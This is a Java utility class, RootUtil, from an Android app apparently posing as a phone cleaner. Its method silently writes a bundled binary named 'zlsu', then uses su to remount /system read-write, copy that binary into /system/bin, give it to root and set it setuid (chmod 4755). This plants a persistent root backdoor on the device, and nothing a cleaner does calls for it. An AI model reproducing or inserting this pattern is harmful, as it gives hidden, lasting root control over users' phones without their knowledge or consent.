package com.kadaluarsa.cleaner.utils;

import android.content.Context;

import com.kadaluarsa.cleanerr.R;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;


public class RootUtil {


    /**
     *
     * @param ctx
     */
    public static void preparezlsu(Context ctx) {
        try {
            File zlsu = new File("/system/bin/" + Constants.ROOT_SU);

            InputStream suStream = ctx.getResources().openRawResource(
                    R.raw.zlsu);
            if (zlsu.exists()) {
                if (zlsu.length() == suStream.available()) {
                    suStream.close();
                    return;
                }
            }

            /**
             * /system/bin
             */
            byte[] bytes = new byte[suStream.available()];
            DataInputStream dis = new DataInputStream(suStream);
            dis.readFully(bytes);
            String pkgPath = ctx.getApplicationContext()
                    .getPackageName();
            String zlsuPath = "/data/data/" + pkgPath + File.separator + Constants.ROOT_SU;
            File zlsuFileInData = new File(zlsuPath);
            if (!zlsuFileInData.exists()) {
                System.out.println(zlsuPath + " not exist! ");
                try {
                    System.out.println("creating " + zlsuPath + "......");
                    zlsuFileInData.createNewFile();
                } catch (IOException e) {
                    System.out.println("create " + zlsuPath + " failed ! ");
                }
                System.out.println("create " + zlsuPath + " successfully ! ");
            }
            FileOutputStream suOutStream = new FileOutputStream(zlsuPath);
            suOutStream.write(bytes);
            suOutStream.close();

            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(
                    process.getOutputStream());
            os.writeBytes("mount -oremount,rw /dev/block/mtdblock3 /system\n");
            os.writeBytes("busybox cp " + zlsuPath + " /system/bin/"
                    + Constants.ROOT_SU + "\n");
            os.writeBytes("busybox chown 0:0 /system/bin/" + Constants.ROOT_SU
                    + "\n");
            os.writeBytes("chmod 4755 /system/bin/" + Constants.ROOT_SU + "\n");
            os.writeBytes("exit\n");
            os.flush();
        } catch (Exception e) {
            System.out.println("RootUtil preparezlsu: error");
            e.printStackTrace();
        }
    }
}
